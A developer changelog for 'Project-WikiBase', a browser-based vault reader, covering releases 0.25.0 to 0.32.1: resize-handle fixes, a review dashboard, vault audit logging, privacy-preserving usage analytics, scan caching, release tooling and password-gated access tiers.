# Project-WikiBase — Changelog

*One entry per shipped deploy. Newest at top. Not a substitute for the session log — this is the short version, for tracking what actually went out the door.*

*Packaging (changed 2026-08-03, from 0.19.1 on): deploys are a plain `deploy/` folder in the project root, not a versioned zip. Deployment now happens from this PC straight into the repository, so a zip was one unpack step with nothing to show for it. The folder is overwritten in place each release; the version it holds is whatever the badge in `index.html` says.*

*Versioning (locked 2026-07-22): `MAJOR.MINOR.PATCH`. MAJOR stays `0` for the whole beta — moves to `1` at full release. MINOR bumps when a session ships new user-facing capability; PATCH bumps when a session only fixes or polishes what's already shipped. MINOR always resets PATCH to `0`. Everything below `0.12.0` was originally shipped under an older `vX.Y[-N]` tag — those are noted per entry for traceability against already-shipped deploy zips. Everything from `0.12.1` onward is native to this scheme.*

*Note: the entries reconstructed as v0.8c / v0.8d / v0.8e-1 below are from partial notes — those sessions moved the app forward without a session-log entry at the time (a known documentation gap). Everything from v0.9a onward was tracked in full going forward.*

---

## 0.32.1 — 2026-08-10

**Changed:** `index.html`, `supporting/tests/review-bugfix-0321.test.js` (new), `supporting/tests/docks.test.js`, `supporting/tests/README.md`, `README.md`, `help.md`, `help-edit.md`

*Four reported defects. Three of them had been failing silently for releases — a measurement that always returned its own maximum, a badge painted only by a code path that ran once per scan, and a property check whose result was computed and thrown away.*

### Double-click on a resize handle now fits to the content

Double-clicking a handle is supposed to widen the panel to its longest visible row. It widened to the cap instead, every time, on both sides.

The measurement asked each row for its `scrollWidth` while the panel was temporarily set to maximum. But every row class in that list is a block or a flex container, so it stretches to whatever it is given: the answer was always the panel's width, which was always the maximum. Rows are now measured at `width: max-content`, which is the only phrasing of the question that means *how wide do you want to be*, and restored in the same frame.

The right panel looked like a different bug and was the same one plus a second miss. Dragging a panel wide resets the opposite panel to its default first, so the reader-minimum ceiling is computed against a sane neighbour. Double-click skipped that reset, so with the left panel already expanded the ceiling for the right one landed just above the snap threshold and the panel appeared to collapse rather than fit. Same reset, both gestures.

The cap moved from 480 to 720 for headroom. The reader minimum was always the real limit; this only raises what the limit is allowed to use.

Also found while checking the row list against the markup: `.ot-row` has never existed. The Outline pane's row is `.rp-outline-item`, so the Outline has been fitting to nothing but its own header since the feature shipped. **A selector that matches nothing is silent** — the same failure shape as the three bugs above.

### One bottom stack for every review item type

Clicking an item on the Review dashboard put a single line at the *top* of the reader — the walk bar — and, for four of the eight item types, nothing at the bottom at all. Flagged, Due, New file and Missing properties opened the Properties flyout in the opposite corner instead. So the review surface was a one-line strip in the wrong place.

The walk bar moved out of the reader to the top of the bottom stack. Those four types now get a bottom detail strip: the file's whole property block, the absent keys named as **not set** rather than left as blank cells, and that type's one action. The flyout is still one button away for actually editing a value.

Both strips are wired by one `makeStripResizable()` rather than two copies of a closure — a copy is how two things that must match stop matching. It also fixed two things the diff strip had on its own: a mousedown starting on Accept could turn into a resize, and the dragged height was persisted on every drag and read back nowhere.

Walking the queue used to `soloRPTab()` the Review pane, silently tearing down the user's pane layout one item at a time. It opens the tool now.

### The highlight says what it found

`highlightChangedLines()` returns its hit count and the strip title reports it. There are two legitimate reasons nothing lights up — the change was a pure deletion, so the text is no longer in the file to highlight, and a rewritten line that no longer matches any rendered block — and both used to be indistinguishable from a broken feature. The changed-block tint also gained the gutter bar the vault-audit markers use; a bare wash of `--co-green-bg` on a light theme is almost the reader background.

### The Review pane shows the board, and the badge stops disappearing

S41 made the pane per-file and moved the vault-wide list to the "All changes" page. With no file open the pane read *"Open a file to see its changes"* while the dashboard said nineteen items were waiting, so a tool with a **19** on its icon opened onto an empty panel. The vault-wide board is back at the top of the pane, the open file's own changes sit beneath it.

The badge itself: `renderRails()` rebuilds the count spans hidden and reading `0`, and the only thing that ever wrote a real number into them was the end of a full vault scan. So the count was correct right after a scan and blank after **any** dock action in between. Counts are derived state; the render that builds the element they live in is the render that fills it. `paintRailCounts()` is now that one place, called by both.

`renderReviewOverview()` and its two action helpers are deleted. S41 left a comment saying the function was "still called by the All changes page." It was not — nothing had called it since, and a suite asserted it existed, so a test was keeping ninety lines of unreachable code alive.

### Every declared property gap is reported

`OPTIONAL_PROPS` was filtered, attached to the row, and only ever *seen* on a file that was already failing on a required key. A file carrying all four required keys and none of the optional ones was reported nowhere. Since `must-read` and `onboarding` arrived with What's New in 0.23.0, that is every file predating it — exactly the population the check exists to find. It is loud on first run by design, and **Fill all** answers the whole list in one action.

The check is now **independent of the cause chain, the same exception Due already gets**, and this is the load-bearing part. The obvious fix is to widen the required-key branch to include the optional ones. That branch is also where the vault audit takes its delta and where Flagged is decided, and on a vault that has never been swept every file has an optional gap — so widening it would have taken the whole vault out of the audit on the one run where the audit matters most. Incompleteness is a fact about a file, not a decision about it, so it does not compete for the file's one cause. New file rows now name their absent keys too, still as one row and one cause.

### Testing

`review-bugfix-0321.test.js`, 68 checks. jsdom does no layout, so a sizing function tested against it passes whatever it returns; the suite fakes `getBoundingClientRect` on the rows under test and asserts the panel comes out **364px** wide, not that the function ran. **Each of the four fixes was reverted in a scratch copy and the suite confirmed to go red for that fix alone** — the point being that three of these bugs were silent wrong answers, and a suite that only proves the fix is present would not have caught any of them in the first place.

Two assertions in `docks.test.js` were rewritten. They searched the whole file with a character-distance window (`getReaderMin()` within 1400 characters of `fitPanelToContent`), so adding comments to the function broke a passing test without changing a behaviour. They read the function's own source now.

---

## 0.32.0 — 2026-08-07

**Changed:** `index.html`, `supporting/tests/usage-analytics.test.js` (new), `supporting/tests/README.md`, `help.md`

*Usage analytics. Which pages get read, which never do, and which have gone quiet. Shipped immediately after 0.31.0 and separately from it, so a problem in either is attributable to one of them.*

### Four decisions, locked before anything was written

Each of these closed off an alternative that looks like an improvement from the outside, so all four are recorded in the code beside what they govern:

1. **One row per page per day, not one per open.** A row per open grows with traffic: forty pages a day, twenty days, ten people is roughly six megabytes of log a year, all of which the view would have to replay. Per day bounds the rows by *distinct pages read* and answers every question the report actually asks.
2. **Administrator only to view.** Not Contributor. This is the first tool gated above Contributor, so `WB_TOOLS` gained an explicit `tier` rather than a second boolean beside `gated` — a ladder position is not a pair of flags.
3. **Files, never people.** This is a file audit, not a user audit. The names are dropped inside `usageAggregate()`, which reads the per-person files and returns totals with nothing attached, so no render downstream is in a position to leak one. The rule is enforced by the data shape, not by every caller remembering it.
4. **Collection runs at every tier.** Gating collection to Administrator would make the numbers describe one person's reading and call it the team's.

### How it records

The page you are on is noted once it has **rendered** — the same point What's New treats as "you are here", so a file that failed to load is never counted. Nothing is written while you read. On leaving the tab the sitting is folded into a buffer and flushed to `zSystem/Analytics/YYYY-MM-<user>.md`, one file per person per month.

Per-person files are what stop OneDrive making conflict copies when two people read at once. The file is **rewritten** rather than appended, unlike the audit log, and that is safe for the specific reason that a usage file has exactly one writer — rewriting is what merges same-day rows into one instead of stacking them.

Two guards worth naming. **Dwell is capped per visit**, so a tab left open over lunch cannot outweigh a week of real reading; opens are the honest signal and seconds only support it. And the buffer is **mirrored to `localStorage` on every commit**, because a `pagehide` write is not guaranteed to finish when a browser is killed — without the mirror, closing hard would lose the whole sitting.

### How it reports

Three lists: **Most read**, **Never opened**, **Gone quiet**. The middle one is the point — either the page is dead and can go, or it is needed and nobody can find it. Gone quiet is deliberately not "low count": a page with two opens last week is fine, a page with sixty opens and none this month is the one worth looking at.

Top five per section with a **Show more** out to twenty-five. The cap is real, not a render trick: four hundred rows is not a report, it is the raw data with extra steps.

**The logs are read only when the pane is opened**, cached for a minute, and never touched by the badge scan or by boot. That restraint is the direct lesson of 0.31.0, where the approval-log replay had been called from the scan and had to be pulled back out.

### Covered by

`usage-analytics.test.js`, 67 checks, a large share of them asserting **absence** — that Contributor sees no pane and no rail icon rather than a disabled one, that a demotion un-docks it, that no name or email survives into the rendered output, that no shared counts file or external endpoint exists, and that the scan never calls the aggregate.

---

## 0.31.0 — 2026-08-07

**Changed:** `index.html`, `supporting/tests/scan-cache.test.js` (new), `supporting/tests/README.md`

*No new features. The badge scan stopped re-reading a vault that had not moved, and four smaller costs in the same sweep were closed with it. Shipped on its own, ahead of the Usage panel, so the two are separately revertible.*

### Switching back to the tab no longer re-reads the whole vault

`scanBadges()` ran on every `visibilitychange`, and it swept every note in the vault: a full read of each file, a speculative read of both its sidecars, and at Contributor and above one hash of the note plus one hash per heading. Correct, and priced per note times per heading — which is the wrong direction for a vault that is filling out with long documents.

It now keeps a per-file record of the parsed inputs (frontmatter, comments, change entries, hashes) and reuses it while the file's **modified stamp and size** are unchanged. That gate is not new: `wnBuildIndex()` has used the same two fields since 0.25.0, and enumeration has carried them for free just as long. A steady-state scan now reads nothing.

**The cache holds parsed inputs, never derived rows.** The rows also depend on the audit baseline and on the current tier, so a cache of rows would need invalidating on both and would become the second source of truth this project keeps refusing. Tier is in the cache key, so unlocking Administrator costs one full scan and then settles.

Accepted limitation, inherited deliberately from What's New: a sync tool that rewrites a file's content without changing either its size or its modified stamp would be missed. Same gate, same exposure, one place to fix it if it ever happens.

### Four smaller costs in the same sweep

- **Absent sidecars are no longer opened speculatively.** Every note used to attempt both a `.comments.md` and a `.changes.md` read; on a vault where most notes have neither, that is two thrown-and-swallowed errors per note per scan. One directory listing per `zSystem` folder now answers existence for every note in it, and yields each sidecar's own stamps as a bonus — which is what lets a comment added on another machine invalidate exactly one cache entry.
- **The fan-out is bounded.** The sweep was `Promise.all` over every file, which asks the file system for three things per note all at once. Eight lanes now, which keeps the pipe full without handing the browser a burst it can only queue.
- **The approval-log replay is cached.** It re-read every approver's every monthly log on every scan, and that folder grows by one file per person per month forever. It now compares the folder's own stamps first, and is cleared outright whenever an approval is appended.
- **A scan requested during a scan is no longer dropped.** The guard returned early, so a save or an approval that landed mid-scan left the badges describing the vault as it was before it. Any number of dropped requests now collapse into one trailing re-run.

Local-vault mode only, throughout. The dormant SharePoint path has no cheap per-folder stat, so it keeps its original read-and-see behaviour rather than acquiring a fast path nobody can test.

### Covered by

`scan-cache.test.js`, 41 checks. It **counts reads through a faked file system** rather than asserting about them, because a stale cache returns a perfectly well-formed wrong answer that a happy-path suite would wave through. It also asserts the derived badge state is byte-identical with the cache warm and cold, asserts the old unbounded shapes are absent so a revert turns it red, and measures the concurrency watermark rather than trusting the limit.

---

## 0.30.0 — 2026-08-06

**Changed:** `index.html`, `supporting/tests/vault-audit.test.js` (new), `supporting/tests/change-detection.test.js`, `supporting/section15-sample.html` (new), `README.md`, `help-edit.md`

*Blueprint Section 15, the vault audit. The last remaining build section, and the two review item types 0.29.0 deliberately left out.*

### Edits made in Obsidian now surface for sign-off

WikiBase is a reader, so nearly every change to the vault happens somewhere else. Until now nothing surfaced them. The dashboard gains two types:

- **Vault change** (orange, band 1) — a note whose content differs from the last approved version. One row per file no matter how many things changed inside it.
- **New section** (yellow, band 2) — a note whose *only* difference is new headings. Additive, so nothing was altered and nothing was lost, and **Acknowledge all** covers it.

**Approve means acknowledged, not gated.** The edit already happened and already synced. Approving records that a competent person read it. There is no reject: **Flag** posts an ordinary comment instead. Reverting would overwrite work sitting in someone's open Obsidian window while OneDrive syncs underneath, so the existing reject-revert path stays scoped to in-app edits, where the app still holds the before-text it wrote.

### The log, and why there is no index

Each approver appends to their own `zSystem/audit/YYYY-MM-<user>.md`. Rows are only ever added. The approved baseline for a note is its most recent row across every approver's log, replayed on each scan — so there is no shared mutable file for OneDrive to make a conflict copy of. Same per-person-file pattern already locked for analytics.

First run records the whole vault as approved, same call as What's New. Without it day one opens with every note in the queue, which carries no information.

### In-file review, not dashboard diffs

The row is a one-line blurb. Clicking it opens the note with the change marked where it sits, and a bar at the foot of the reader carrying prev/next, Approve file, Flag and Version history, so a queue is cleared without returning to the dashboard. Three markings: green NEW SECTION, amber CHANGED, and red dashed REMOVED.

**A removed section is drawn back into the view and never written.** It exists in the rendered DOM only, is `user-select: none` so a copy of the page cannot pick it up, and disappears on the next render. An addition announces itself the next time someone reads the page; a deletion is invisible by definition, which is why it gets the loudest marking.

**Marking is per section, not per line.** The log stores hashes, not content, so the app has no copy of the previous text and cannot produce an honest line diff. For exact wording it links out to OneDrive version history — the Session 37 call. Storing snapshots to fake a line diff would mean keeping a second copy of the vault.

### Also

- Filter chips carry a colour dot, one colour per type, all from the existing callout palette. `Content change` is renamed **App edit** now that there are two kinds of edit to tell apart.
- Frontmatter is stripped before hashing, so the app's own property writes never flag a page nobody edited.
- **Fixed during the build, found by the new suite:** two approvals landing in the same second let the *earlier* row win the replay, so a file could never leave the queue. Timestamps now carry milliseconds and a tie resolves to the later row.

---

## 0.29.1 — 2026-08-06

**Changed:** `index.html`, `supporting/tests/table-spacer.test.js` (new), `supporting/table-spacer-sample.html` (new), `README.md`, `help.md`

*Polish only. One reader change, plus a log compression and project cleanup.*

### Table width-padding rows are hidden, not dropped

- **A table row made entirely of periods no longer renders.** Obsidian's table editor sizes a column to its widest cell, so padding a row with `.....` is how you make a narrow column wide in the vault. That row was showing up verbatim in the reader.

- **It is hidden, not removed — and that distinction is the feature.** The cells still lay out at their normal 14px, so the column widths the padding was written for survive into the reader; only the periods and the row's height go away. Removing the row instead would have deleted the one effect it was ever written to have, and every table would have snapped back to content width.

- **The match is whole-row, deliberately.** A row qualifies only when at least one cell is **5 or more periods and nothing else**, and every other cell is empty or periods-only. A cell reading `Waiting.....` keeps its row. A per-cell test would have been simpler and would have silently eaten real content the first time someone wrote a long ellipsis in a table.

- Separator rows are filtered before this test runs, so dashes never reach it. Hidden rows carry `aria-hidden`, so screen readers skip them, and `user-select: none`, so copying a table doesn't pick up invisible dots.

---

## 0.29.0 — 2026-08-06

**Changed:** `index.html`, `supporting/tests/review-dashboard.test.js` (new), `supporting/tests/paragraph-breaks.test.js`, `README.md`, `help.md`, `help-edit.md`

*Comments & Review — the review dashboard. Six of the eight item types the spec named; changed-outside-the-app and new-section wait for Section 15, the vault audit, which is next.*

### The review dashboard

- **One queue, typed items, three bands.** Band 1 (needs your decision: content changes, questions, escalations) sits above band 2 (needs acknowledgement: flagged, due) above band 3 (needs completion: new files, missing properties) — reading top to bottom is the review order. A band with zero items collapses itself and still shows a count of zero rather than disappearing, so the queue's shape stays stable between visits.

- **Every type is stateless.** Each is re-derived from vault-native truth (frontmatter or a sidecar) on every `scanBadges()` sweep — no new store, nothing to keep in sync. Replaces the old "All changes" page, which only ever read `.changes.md`.

- **A file is sorted into exactly one cause.** No status key is New file; status present but a required key missing is Missing properties; an unreviewed content-change entry is Content change, never also Flagged, even though the same in-app save sets both signals — Accept/Reject is the sharper action and wins.

- **An open question blocks the file from leaving the queue.** New behaviour — previously a question was invisible to review entirely.

- **Escalation is a fifth comment type**, not a third store: Note, Question, Action, Flag, Escalate, in the same panel every file already had. Fixed direction, Contributor to Administrator, so there's no per-person roster — tiers are shared passwords, not tied to identity. Escalated items sort to the top of band 1.

- **Due for re-review** is live: the `due` property existed and drove nothing since Session 13. A passed due date surfaces in band 2; acknowledging clears it.

- **Previous** — a collapsed section at the bottom listing resolved items across all six types: accepted/rejected changes, closed comments, files marked Reviewed. Nothing is ever deleted to build it; the 30-day default is a view, not a retention limit, and never applies to the live bands above. Comments and content-change entries now carry `closedTs`/`resolvedTs` so this has a real "when," not just "when it was first raised."

- **Bulk actions, band 2 and 3 only.** "Fill all" writes only absent keys across every band-3 file; "Acknowledge all" marks band-2 flagged files Reviewed and clears due dates. Band 1 never gets one — if it could be done in bulk it wasn't a decision. A file "Fill all" completes still carries `status: Needs Review`, so it correctly funnels into Flagged next rather than silently leaving the queue.

- **Next-item walk.** Clicking a row opens the file and lands on whichever existing surface already shows that item — the diff strip for a content change, the Comments pane (selected) for a question or escalation, the Properties flyout for a frontmatter fix. Next walks the same band-ordered list the dashboard rendered, no re-scan.

### Property schema declared

- `status`, `reviewed`, `created`, `author` are required; `tags`, `aliases`, `due`, `must-read`, `onboarding` are optional. `must-read`/`onboarding` arrived with What's New (0.23.0) and had never been added to the fill defaults until now.

- **`section` is dropped** — decided out in Session 37, carried in the defaults and the Properties flyout ever since. Removed from both, plus the new-file creation template.

- **A property fill writes the missing keys and nothing else.** `approveNewFileCore()` no longer stamps `edited-by`/`edited-at` unconditionally — correct for one deliberate file, wrong for a bulk sweep, where it would mark every file in the vault as edited by one person today.

### Not in this build

Changed-outside-the-app and new-section need a shared baseline that doesn't exist yet — Section 15's per-approver audit log, specced but not built. Building them now on a per-device `localStorage` baseline would silently diverge between people; both wait for Section 15, which is next.

---

## 0.28.0 — 2026-08-06

**Changed:** `index.html`, `supporting/tests/docks.test.js` (new), `supporting/tests/access-tiers.test.js`, `supporting/tests/paragraph-breaks.test.js`

*Two docks instead of a sidebar and a panel that never rhymed. The review workflow is deliberately NOT in this release — it is specced in `docs/project-wikibase-review-workflow-spec.html` and is the next session.*

### Panel assignment

- **The left sidebar and the right panel are now the same thing.** A dock is a rail of tool icons over a stack of panes. Both are rendered from one registry, `WB_TOOLS`, by one function, `renderDocks()`. Before this, the right panel had a six-tab rail with stacking, resizing and solo, and the left was a fixed single-purpose tree that had none of it.

- **Default assignment: left is where you go, right is what you are reading.** Left holds Vault Files, Search and Bookmarks; right holds Outline, Comments, Links and Review. Search and Bookmarks were navigation tools sitting in the panel that otherwise means "about this file".

- **Any tool can be moved to either dock.** Via the move button in its pane header, or by dragging the header across. Both dock assignment and stack order persist per user in `wb_docks`.

- **Vault Files is pinned.** It can be reordered against Search and Bookmarks but cannot be closed or moved to the right dock, through any route — close, move, toggle and drag all refuse. A stored layout that lost it has it restored on boot, because that store is user-writable JSON and losing the file tree would leave nothing to click.

- **Stack order is explicit.** It used to be click order via `state.openRPTabs` with no way to reorder.

- **Pane sizes persist.** `state.rpFlex` reset to an even split on every reload, so which tools were open survived a restart and the shape you gave them did not. Half a layout persisting is worse than none.

- **New and Move left the header** for the foot of whichever dock holds Vault Files. They act on the vault tree. Their tier gate is unchanged — this is a placement change only.

- **One pane header replaces three constants.** `RP_HEADER_COMMENTS`, `RP_HEADER_LINKS` and `RP_HEADER_REVIEW` each restated what the rail above already said and carried no controls. `paneHead()` is `#ot-toolbar`'s shape generalised: label, optional count, the pane's own controls, then move and close. `#sb-toolbar` and `#ot-toolbar` keep their own markup and gain the drag affordance.

### The panel shell

- **The inbox strip is gone, and so is `updateInboxStrip()`.** "Comment Inbox" is now **All comments** and sits inside the Comments pane, pinned to its bottom; "Review Inbox" is now **All changes**, inside the Review pane. The strip lived above the panes until 0.24.0, where showing it pushed every pane down, then below them, which fixed the jump but left two buttons in the panel belonging to no tool in particular. Both positions were wrong for the same reason. **The rule this settles: the pane is per-file, the page is vault-wide.**

- **Following from that rule, the vault-wide overview left the Review pane.** It renders on the All changes page only. It was appearing in both.

### Resize handles

- **Three gestures, two targets, no overlap:** drag the handle to resize, click the flare to collapse or expand, double-click the handle line to fit the panel to its widest visible row.

- **The flare no longer collapses the panel when you meant to drag it.** It used to swallow `mousedown` and toggle on any click, so aiming at the flare to start a drag collapsed instead. **The fix is distance, not duration** — movement past `CLICK_THRESHOLD` is a drag however long you took over it. A time threshold would fight the drag, since a slow careful resize is exactly what a long-press rule misreads.

- **Fit-to-content fits what is rendered, not the vault.** Fitting to the longest name inside a collapsed folder would throw the panel open because of a file you cannot see. It measures against a temporarily widened panel, because every row in there ellipsises and a clipped row always answers "exactly as wide as I already am".

- The old double-click-to-collapse on the handle line is gone; collapse lives on the flare only, which is what freed double-click.

### Tests

- **`docks.test.js`, 104 checks, new.** Asserts both sides through the same operations, since a suite that only exercised the right dock would pass on the old code. Asserts the deleted shapes are absent (`openRPTabs`, `rpFlex`, the strip, `updateInboxStrip()`, New and Move in the header) so a revert turns it red rather than a half-revert slipping through.

- `access-tiers.test.js` now asserts a downgraded Review tool is dropped from **neither dock**, not just the right one — the old single-array check would have passed for free the moment Review was moved left. Adds the pinned-tool refusals.

- `paragraph-breaks.test.js`'s inbox-strip block is rewritten against the new invariant: the button is a descendant of its pane, in a footer that is the pane's last child.

### Migration

- `wb_rp_open` is read once into the right dock when there is no `wb_docks` yet, and is **left in localStorage untouched**, so reverting this file restores the previous layout exactly. Same courtesy as the `wb_review`/`wb_editing` keys in 0.27.0.

---

## 0.27.2 — 2026-08-06

**Changed:** `index.html`, `help.md`, `help-edit.md`, `supporting/tests/change-detection.test.js`, `supporting/tests/access-tiers.test.js`

*A colour on the date, the recovery path written down instead of built, and the release itself put under test.*

### Releasing

- **`README.md` said "Current version: 0.19.2" for eight releases.** That string is the only place in the project that claims a current version, and nothing ever read it back, so it drifted silently while `index.html`, `deploy/` and the changelog were all correct. It is the version that was reported as showing up in the deploy.

- **The archive zip stopped at 0.19.0.** Not an oversight so much as a side effect: 0.19.1 replaced the versioned zip with the `deploy/` folder, and the backup went with it. **0.20.0 through 0.27.1 have no zip and cannot be reconstructed from this folder** — only GitHub history has those. Zips resume at 0.27.2 in a new `archive/` folder, `wikibase-v<version>.zip`, the exact contents of `deploy/`.

- **`supporting/release.sh <version>` is now the whole release.** It refuses to run without a matching changelog entry, stamps the version into `index.html`, `README.md`, `help.md` and `help-edit.md`, **reads all four back** rather than trusting the write, runs every suite, rebuilds `deploy/` with each copy verified, writes and verifies the archive zip, and refuses to overwrite an existing backup without `--force`. Strays found in `deploy/` are moved to `_delete-me/`, never deleted, per the standing rule.

- **`release-integrity.test.js`, 29 checks, is the odd suite out** — it tests the release rather than the app. Every other suite passed for eight releases while the README was stale, because none of them looked. This one compares all four version strings to the badge, diffs `deploy/` against root byte for byte, checks the archive zip exists and contains the right version, and asserts `release.sh` still performs the guards it documents. `release.sh` runs it last, after the release has actually happened.

- **Deliberately untouched: `sw.js` and git.** The service worker is network-first, so a new shell lands on its own and bumping `CACHE` would force a pointless re-download. **A failed GitHub Pages run is the one failure none of this can catch** — the app, `deploy/` and the archive will all read correctly while the live site serves the previous version. The script says so on the way out.

### The app

- **The date in What's New is now coloured by age** — green within the last week, amber to a month, muted after that. It sits on the date itself rather than on a new glyph, because that element already means "when" and the pills already mean something else: New is green, so a second green dot beside it would make one colour say two things.

- **Green, amber, muted rather than green, amber, red.** Red is spent app-wide on destructive things, and a page that changed two months ago is not a fault, it is just less likely to matter. Muting says that; red would say something is wrong. The colour is always redundant reinforcement, never the only channel — the group heading and the date itself still say the same thing in words.

- **The colour reads off the same two constants as the grouping**, `WN_AGE_WEEK` and `WN_AGE_MONTH`. The proposal was 7 / 30 / 30+ and the groups had always been 7 / 31; a row filed under "Earlier this month" with an old-coloured date is a contradiction the reader has to resolve, so the existing boundary won and both signals now come from one place. There are tests at both boundaries asserting the two agree, not just that each is individually right.

- **Password recovery already existed. Nobody knew, and the app made it look broken.** The hashes are a file in the vault at `zSystem/auth.json`; deleting it in Obsidian or SharePoint unarms the gate, which is the already-documented "no Administrator hash means every tier is open" rule. But `loadVaultAuth()` only ran at boot, so deleting the file changed nothing on screen until a reload — and tabbing out to delete it and tabbing back is the literal shape of the recovery. It is now re-read on every focus regain, alongside the vault scan. That also picks up a password another Administrator changed while you were away, which used to leave a device unlocking against a stale hash.

- **A recovery note in Settings, deliberately outside the Administrator block.** The person who needs it is stuck at User; hiding it behind the rung they cannot reach is the one placement that fails. `help.md` gains a *Forgetting a password* section with the four steps, and Troubleshooting points at it.

- **Nothing was built that could be reached from the browser without the password.** A reset button on that screen is a second door with no lock. A recovery code was considered and rejected: a third secret to lose, exactly as strong as the file it would sit beside, and no help to the one person who has lost the other two. Email reset needs a server this app does not have. The vault is the recovery, and anyone who can be locked out already has the vault access to undo it — if that is not acceptable, the thing to change is who can write to the vault.

- **`change-detection.test.js` is 114 checks, `access-tiers.test.js` 111.** Includes a check that no browser-reachable password reset was introduced, which is the kind of thing a later session adds in good faith.

---

## 0.27.1 — 2026-08-06

**Changed:** `index.html`, `supporting/tests/change-detection.test.js`, `supporting/tests/whats-new.test.js`

*Three reports against What's New, two of them the same one line.*

- **What's New only moved on a full app reload.** `refreshVaultTree` marks every loaded folder stale when the app regains focus, but only really reloads the folders you have expanded — a collapsed folder's badge is not worth a fetch nobody will look at. `loadAllFolders` then filtered on `folderLoaded` alone and skipped those stale folders too, so every file inside one kept its boot-time size and modified time for the whole session. The scan's stage-1 comparison found nothing to hash, so nothing was ever reported. One line: stale now counts as not loaded. The cost is metadata only — file bodies are still read solely where size or modified time actually differs.

- **The same line was the third report.** "Edit a section, clear it, edit it again, nothing shows" was not a section bug at all. The second edit was never enumerated, so there was nothing to detect. It is fixed by the same change, and there is now a test that walks that exact sequence: seed, edit, clear, edit again.

- **One section click cleared every badge on the file.** Both routes into a page ran `wnMarkSeen`, which deleted the file's whole section list. Arriving from a section button now stashes that heading's uid, and leaving the page answers only that section. **The file's own seen stamp is withheld until its last unread section is gone** — the alternative, stamping the file on the first click and leaving the rest showing, produces a seen row with unread badges under it, which is a state the reader has to reconcile rather than read.

- **Read sections stay listed instead of being deleted.** They recede — muted, dashed border, still clickable — the same treatment a seen file row already gets. This is what makes the other filter views usable: sections used to be gated on `!seen`, so Unseen showed structure and **New, Updated, All and the 30/90/all-time windows collapsed to a bare list of file names**, with no way back to a section you had clicked by mistake. Every Updated row now carries its sections in every view. A New page still lists none, because there is no "before" to diff it against and the whole file is the change.

- **Unread sections sort ahead of read ones**, so the six-item display cap is never spent on sections you have already opened while an unread one falls off the end. The store keeps at most 12 entries per file, trimming read ones oldest-first and never dropping an unread one.

- **A section that changes again goes back to unread**, even if you had already read it. Clearing a section answers the edit you read, not every edit that heading will ever get.

- **Storage shape moved from `[uid, title]` to `[uid, title, read]`.** 0.26.0 entries read as unread, which is exactly what they were, so nothing needs migrating.

- **`change-detection.test.js` is 99 checks, up from 66.** Each of the three fixes was reverted individually and confirmed to turn the suite red, including through `wnCommitPending` rather than only the function under it — a fix wired to nothing ships green otherwise.

---

## 0.27.0 — 2026-08-05

**Changed:** `index.html`, `help.md`, `help-edit.md`, `supporting/roles-tiers-sample.html`
**Added:** `supporting/tests/access-tiers.test.js`

*Two checkboxes anyone could tick became three tiers on a ladder.*

**"Show review tools" and "Enable editing" are gone**, replaced by a single **Access** setting in Advanced Settings: **User** (default), **Contributor**, **Administrator**, each inheriting everything below it. Moving up asks for that tier's password; moving down never does, so nobody is stuck in a mode they turned on by accident.

- **Editing sits in Contributor, not Administrator.** Only an edit made in the app writes a change record, so with editing at the top the one person who can create review work would sit above the reviewer and the Contributor queue would be empty by design. Contributor is "trusted with content"; Administrator is "runs the system."
- **Two passwords, stored as SHA-256 hashes in the vault** at `zSystem/auth.json`. That is what makes them survive an update: a deploy replaces the app files and the vault is a different folder it never touches. It is also why they can be changed in-app without a redeploy. A file in the GitHub repo was considered and rejected, since the repo is public and a deploy would overwrite it anyway.
- **The Administrator password is what arms the gate.** Until one exists, every tier is reachable with no prompt and Settings says so in plain words. Two alternatives were rejected: "a tier with no password is open" fails open in the case that matters, because a Contributor password with no Administrator password is decorative; "any password set locks every tier without one" locks the person who just set one out of setting the other. First-time setup asks for both together, and refuses two matching passwords, so a half-configured ladder never exists.
- **Locked surfaces are not rendered at all**, matching how the Review tab already behaved. The one exception is the tier dropdown itself, because hiding the rung you are climbing makes the ladder unreachable.
- **`CONFIG.editors` and `canEdit()` are removed.** `editors` defaulted to `[]`, meaning everyone, and compared against `CONFIG.authorName`, still a placeholder since identity moved to `zSystem/Users/` in 0.14.0. It was a permission list that had never once denied anything.
- **Behaviour change worth knowing:** the Properties flyout used to call `canEdit()`, so its fields stayed editable even with "Enable editing" off — a vault write the editing gate was never actually applied to. It is Contributor now, like every other write.
- **The old `wb_review` and `wb_editing` keys are deliberately not migrated.** They were unprotected checkboxes; carrying them forward would hand every existing device Contributor without ever asking for the password the tier exists to require. Everyone starts at User and unlocks once. Both keys are left in place, so reverting the file restores the previous behaviour untouched.
- **Stated ceiling, and it is now in `help.md` rather than only in the code:** this is an interface gate, not security. The hashes are readable by anyone with vault access and the check runs in the browser. What hashing buys is that the password itself never sits in readable form. Anyone with vault write access can still edit any note in Obsidian regardless of tier — which is the whole reason the vault audit exists as its own section.

## 0.26.0 — 2026-08-05

**Changed:** `index.html`, `help.md`, `supporting/tests/change-detection.test.js`
**Added:** `supporting/section-detection-sample.js`

*What's New names the sections that changed, and takes you to them.*

**A changed page now lists the headings whose contents moved**, beneath the file name, each one a click target. Clicking a section opens the page at that exact heading and holds the highlight there until you scroll away — the same cue the Outline and search already use. Knowing that a 4000-word handbook changed was never the useful part.

- **The index carries a hash per heading**, not just one per file. Same two-stage machinery as 0.25.0: a page is only read and re-sectioned when its size or modified time moved, so this costs nothing in steady state.
- **A section runs from its heading to the next heading of any level.** An edit under an H4 reports that H4 and does not bubble up to its parents, so one edit names one place. All six heading levels are supported, because the vault uses six.
- **Frontmatter is stripped before hashing.** WikiBase writes its own keys into pages it touches, and leaving it in would flag pages nobody edited. A frontmatter rewrite still counts as a file change; it just reports no sections.
- **A `#` inside a fenced code block is not a heading.** Shell comments and CSS ids would otherwise invent a section per code sample.
- **Changed sections accumulate across scans and clear when you read the page.** Three separate edits between two visits all still show when you finally open it. Marking seen, individually or in bulk, clears the list with it.
- **Duplicate heading text is deduped the way the renderer does it** (`h-overview`, `h-overview-2`), so a click lands on the right one rather than always the first. Where a page also nests headings inside blockquotes or callouts the stored id can miss, and the click falls back to matching the visible heading text — cheaper and steadier than keeping a second parser in lockstep with the block parser.
- **Capped at six sections per file**, with a `+N more` count. A restructured page can report forty headings and turn one row into a wall.
- Renaming a heading reports it under its new name, which is what the reader will see when they open the page.

## 0.25.0 — 2026-08-05

**Changed:** `index.html`, `supporting/tests/whats-new.test.js`
**Added:** `supporting/tests/change-detection.test.js`, `supporting/change-detection-sample.js`

*What's New can finally see an edit. Three shipped features were dead on arrival.*

